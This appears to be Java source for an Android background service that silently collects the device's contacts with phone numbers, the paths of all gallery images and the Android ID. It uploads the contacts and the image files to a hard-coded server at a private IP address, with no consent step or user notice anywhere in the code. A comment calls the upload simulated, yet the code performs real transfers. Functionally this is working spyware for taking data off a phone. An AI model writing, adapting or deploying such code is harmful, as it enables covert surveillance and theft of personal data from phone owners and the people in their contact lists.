package com.phc.serviceapp;

import static android.content.ContentValues.TAG;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class UploadService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            List<String> contacts = fetchContacts();
            List<String> galleryFiles = fetchGalleryData();
            // Fetch Android device ID
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);


            // Simulate upload
            uploadToServer(contacts, galleryFiles, androidId);
        }).start();
        return START_STICKY;
    }

    private List<String> fetchContacts() {
        List<String> contacts = new ArrayList<>();
        ContentResolver resolver = getContentResolver();

        // Query the ContactsContract to get all contacts
        Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                // Query the Phone table to get the phone numbers associated with the contact
                Cursor phones = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId}, null);

                if (phones != null) {
                    while (phones.moveToNext()) {
                        String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        // Add the contact's name and phone number to the list
                        contacts.add(name + ": " + phoneNumber);
                    }
                    phones.close();
                }
            }
            cursor.close();
        }
        return contacts;
    }



    private List<String> fetchGalleryData() {
        List<String> filePaths = new ArrayList<>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = getContentResolver().query(uri, projection, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                filePaths.add(filePath);
            }
            cursor.close();
        }
        return filePaths;
    }

    private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
        String serverUrl = "http://192.168.200.78:3000/upload"; // Updated server URL

        // Upload contacts as JSON (not a file)
        for (String contact : contacts) {
            try {
                // Create JSON payload for contact
                String payload = "{\"type\":\"contact\",\"data\":\"" + escapeSpecialChars(contact) + "\"}";
                sendPostRequest(serverUrl, payload); // Send contact as JSON, no file involved
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload contact: " + contact, e);
            }
        }

        // Upload gallery files as multipart
        for (String filePath : galleryFiles) {
            File file = new File(filePath);
            if (file.exists()) {
                try {
                    uploadFile(serverUrl, file); // Upload files separately as multipart
                } catch (Exception e) {
                    Log.e(TAG, "Failed to upload file: " + filePath, e);
                }
            }
        }
    }

    // Method to upload file using multipart
    private void uploadFile(String serverUrl, File file) throws IOException {
        // Create a new MultipartBody for file upload
        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
        builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))); // Ensure 'file' matches server-side form field

        // Send the multipart request
        RequestBody requestBody = builder.build();
        Request request = new Request.Builder()
                .url(serverUrl)
                .post(requestBody)
                .build();

        try (Response response = new OkHttpClient().newCall(request).execute()) {
            if (response.isSuccessful()) {
                Log.d(TAG, "File upload successful: " + file.getName());
            } else {
                Log.e(TAG, "Failed to upload file: " + file.getName() + ". Server responded: " + response.code());
            }
        }
    }


    // Escape special characters in the string to avoid JSON formatting issues
    private String escapeSpecialChars(String input) {
        return input.replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    private void sendPostRequest(String serverUrl, String payload) throws IOException {
        HttpURLConnection connection = null;
        try {
            // Set up connection
            URL url = new URL(serverUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Write payload to output stream
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = payload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Get the response code from the server
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "Upload successful: " + payload);
            } else {
                // Read the response body for more detailed error info
                InputStream errorStream = connection.getErrorStream();
                if (errorStream != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
                    StringBuilder errorResponse = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        errorResponse.append(line);
                    }
                    Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode + " - " + errorResponse.toString());
                } else {
                    Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode);
                }
            }

        } catch (IOException e) {
            Log.e("Upload", "Error uploading file", e);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
